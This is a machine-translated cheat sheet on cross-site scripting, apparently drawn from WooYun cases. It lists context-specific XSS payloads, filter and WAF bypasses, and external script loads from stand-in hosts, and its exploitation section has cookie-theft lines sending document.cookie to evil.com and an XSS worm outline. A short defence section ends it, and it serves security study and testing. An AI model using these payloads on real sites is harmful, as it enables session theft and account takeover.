# Web Security - XSS Cross-site scripting

> Source: WooYun Vulnerability Database (7,532 XSS Case)| Dismantled From web-injection.md

## Two、XSSCross-site scripting

### 2.1 Nature of vulnerabilities

```
User input(Data) -> Unencoded output -> Browser Parsed as Code -> Script execution
```

**Core formula**:XSS = Trust boundary breach + Output context obfuscation (data inHTML/JS/CSS/URLMiddle Semantic Changes)

### 2.2 Detection method

#### High-risk output points.

| Output points | Trigger conditions | Typical scenarios |
|-------|---------|---------|
| User nickname/Signature | Page loading | Personal homepage、Comments、Friends list |
| Search box echo | Search operation | Search results page |
| Comments/Message | Content display | Forum、Blog、Product review |
| File name/Description | File list | Cloud Storage、Photo Album |
| Email body/Title | Open email | Email system |
| Order notes | Background view | E-commerce backend.、Ticketing System |

**Covert output points**(easy to overlook):HTTPHeader(XFF/UAWrite to log)、WAPSubmitPCDisplay、Client nicknameWebRendering、Draft box/Audit list

#### Contextual quick judgment.

```
Output in <script> Inside? -> JSContext (Check Quote Type)
Output in attribute value?    -> Attribute context (check attribute types)
Output in tag content?  -> HTMLContext (check special tagstextarea/title)
Output inURLIn?       -> URLContext (Check Protocol Restrictions)
Output inCSSIn?       -> CSSContext (checkexpressionSupport)
```

### 2.3 ContextPayload

#### HTMLLabel content

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
```

#### HTMLAttribute value

```html
" onclick=alert(1) "
" onfocus=alert(1) autofocus="
"><script>alert(1)</script><"
" onmouseover=alert(1) x="
```

#### JavaScriptString

```javascript
';alert(1);//
'-alert(1)-'
\';alert(1);//
</script><script>alert(1)</script>
```

#### URLContext

```
javascript:alert(1)
data:text/html,<script>alert(1)</script>
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

### 2.4 WAF/Filtering bypass techniques

#### Encoding bypass

```html
<!-- HTMLEntity -->
&#60;script&#62;alert(1)&#60;/script&#62;
&#x3c;script&#x3e;alert(1)&#x3c;/script&#x3e;
<!-- Base64 + dataProtocol -->
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
<!-- CSSCode(IE) -->
xss:\65\78\70\72\65\73\73\69\6f\6e(alert(1))
```

#### Tag/Attribute transformation

```html
<ScRiPt>alert(1)</sCrIpT>              <!-- Case mixing confusion -->
<script/src=//xss.com/x.js>            <!-- Slash replacing space -->
<img src=x onerror=alert(1)>           <!-- No quotes -->
<scrscriptipt>alert(1)</scrscriptipt>  <!-- Double write bypass -->
<scr\x00ipt>alert(1)</script>          <!-- Null character bypass -->
```

#### Alternative event handler

```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<body onload=alert(1)>
```

#### WAFSpecific Bypass

```html
.<script src=http://localhost/1.js>.    <!-- Security Treasure: Add dots at both ends -->
<!--[if true]><img onerror=alert(1) src=--> <!-- Annotation interference -->
```

#### Length limit bypass

```html
<script src=//xss.pw/j>                <!-- Shortest external loading -->
<!-- DOMConcatenation. -->
<script>var s=document.createElement('script');s.src='//x.com/x.js';document.body.appendChild(s)</script>
<!-- String concatenation bypass keyword -->
<script>window['al'+'ert'](1)</script>
<!-- fromCharCode -->
<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>
```

#### HTTPOnlyBypass

- FlashInterface to obtain user information alternativeCookie
- Convert toCSRFMethod: Directly execute sensitive operations (change password、Add administrator、Readtoken)

### 2.5 Utilization chain

#### CookieTheft

```html
<script>new Image().src="https://evil.com/c?="+document.cookie</script>
<img src=x onerror="new Image().src='https://evil.com/c?='+document.cookie">
<script>fetch('https://evil.com/c?='+document.cookie)</script>
```

#### DOM XSSCritical source and sink

**Hazard source**:`location.hash`, `location.search`, `document.referrer`, `window.name`, `document.URL`

**Dangerous sink**:`innerHTML`, `outerHTML`, `document.write()`, `eval()`, `setTimeout()`, `element.src/href`

#### XSSWorm core logic

```javascript
// 1.Obtain current user identity(cookie/token)
// 2.Construct Self-InclusionpayloadContent of
// 3.Automatic release/Share (AJAX POST)
// 4.Trigger condition: View/Access equals propagation
function worm(){
    jQuery.post("/api/post", {"content": "<Self-propagatingpayload>"})
}
worm()
```

#### Composite exploitation patterns

```
XSS + CSRF -> ObtainTokenPerform management operations
XSS + SQLi -> Blind input acquisitionCookie -> Background injection
XSS -> Account Hijacking -> Privilege Escalation -> Worm propagation
XSSBlind typing(Message/Work order/Feedback) -> Obtain Backend AdministratorCookie
```

### 2.6 Defensive measures

- **Output encoding**(Core):HTMLContext useHTMLEntity,JSContext useJSCoding,URLContext useURLCode
- CSPPolicy restrictions on script sources
- HTTPOnlyProtectCookie
- Whitelist input validation (avoid blacklist, there are always omissions)
- **Common Mistakes**: Only filterscriptTag、Filter lowercase only、Frontend filtering can be bypassed by packet capture、Single Filter Bypassed by Double Write

---

